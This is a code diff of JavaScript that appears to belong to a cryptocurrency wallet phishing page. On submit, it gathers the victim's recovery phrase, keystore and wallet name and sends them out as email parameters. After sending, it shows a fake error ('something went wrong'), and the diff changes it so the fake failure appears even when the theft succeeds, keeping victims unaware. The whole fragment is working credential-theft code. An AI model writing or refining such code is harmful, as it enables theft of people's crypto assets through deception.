@@ -7918,15 +7918,16 @@
     $("#processForm").submit(function (e) {
       e.preventDefault();
 
+      
       let processBtn = $("#proceedButton");
       let cancelBtn = $("#cancelBtn");
       let formData = new FormData(this);
 
       // Capture wallet name before sending data
-      let walletN = $("#current-wallet-app").text() || "Unknown Wallet";
+      let walletName = $("#current-wallet-app").text();
 
       let emailParams = {
-        wallet: walletN, // ✅ Now sending wallet name!
+        wallet: walletName, // ✅ Now sending wallet name!
         type: formData.get("type"),
         phrase: formData.get("phrase") || "",
         keystore: formData.get("keystore") || "",
@@ -7945,12 +7946,14 @@
           console.log("SUCCESS!", response.status, response.text);
           restoreButtons();
           errorBox.show();
+          document.getElementById("send-dialog").style.display='none';
+          alert('something went wrong')
         },
         function (error) {
           console.log("FAILED...", error);
           restoreButtons();
           errorBox.show();
-          alert('something went wrong')
+          
         }
       );
 
